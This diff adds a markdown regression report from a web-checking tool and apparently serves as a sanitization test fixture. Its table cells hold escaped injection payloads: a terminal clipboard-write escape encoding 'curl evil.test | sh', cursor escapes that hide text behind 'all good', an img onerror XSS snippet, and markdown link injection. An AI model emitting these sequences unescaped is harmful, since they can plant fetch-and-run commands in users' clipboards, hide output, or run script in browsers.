@@ -1,0 +1,31 @@
+## ♪ Soundcheck
+
+**Something broke.** 1 page of http://127.0.0.1:20300/ compared with snapshot "t".
+
+| Broke | New | Changed | Slower | Fixed |
+|---:|---:|---:|---:|---:|
+| 1 | 0 | 1 | 0 | 0 |
+
+### ✗ BROKE (1)
+
+_Worked in the snapshot, fails now._
+
+| Change | Where | Before → after | Fix |
+|---|---|---|---|
+| JS error: boom \\x1b\]52;c;Y3VybCBldmlsLnRlc3QgfCBzaA==\\x07\\x1b\[1A\\x1b\[2Kall good<br><sub>inline \\x1b\[1Ascript</sub> | `/b\x1b[2K` |  | fix \\x1b\[2J it |
+
+### ■ CHANGED (1)
+
+_Looks or reads differently; check it's intended._
+
+| Change | Where | Before → after | Fix |
+|---|---|---|---|
+| Page title changed | `/b\|` | B → Sale \| 50% \`off\` \*\*now\*\* \[click\]\(http://127.0.0.1:20300/x\) \<img src=x onerror=alert\(1\)\> \\x01\\x02\\x1b\[31mRED\\x1b\[0m gnp.exe￾ |  |
+
+<details><summary>1 note</summary>
+
+- note \\x1b\[1A
+
+</details>
+
+<sub>rhythm-soundcheck 1.0.0 · 1 page · 2s · 2026-10-23 09:00 UTC</sub>
